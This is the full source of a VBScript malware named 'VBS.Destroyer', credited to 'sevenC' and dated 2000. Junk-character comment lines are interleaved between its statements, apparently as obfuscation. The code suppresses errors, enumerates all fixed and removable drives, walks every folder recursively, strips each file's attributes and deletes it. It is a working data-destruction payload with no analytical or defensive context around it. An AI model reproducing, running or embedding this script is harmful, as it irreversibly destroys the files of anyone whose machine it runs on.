'VBS.Destroyer (c)2000 by sevenC
'ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)
 On Error Resume Next
'ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)
 Set FSO = CreateObject("Scripting.FileSystemObject")
'ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)
 For Each DType In FSO.Drives
'ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)
  If DType.DriveType = 2 Or DType.DriveType = 3 Then
'ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)
	Searching(DType.Path&"\")
'ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)
  End If
'ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)
 Next
'ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)
Sub Searching(fspec)
 On Error Resume Next
'ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)
 Set FS4 = FSO.GetFolder(fspec)
'ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)'ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)
 For Each F2F In FS4.Files
'ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)
	FSO.GetFile(F2F.Path).Attributes = 32
'ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)'ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)
	FSO.DeleteFile F2F.Path
'ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)
 Next
'ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)
 For Each F4D In FS4.SubFolders
'ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)
	Searching(F4D.Path)
'ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)
 Next
'ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)
End Sub
'ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)
'ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)ò3òÏþ°×æW{°åTÃyë¦5)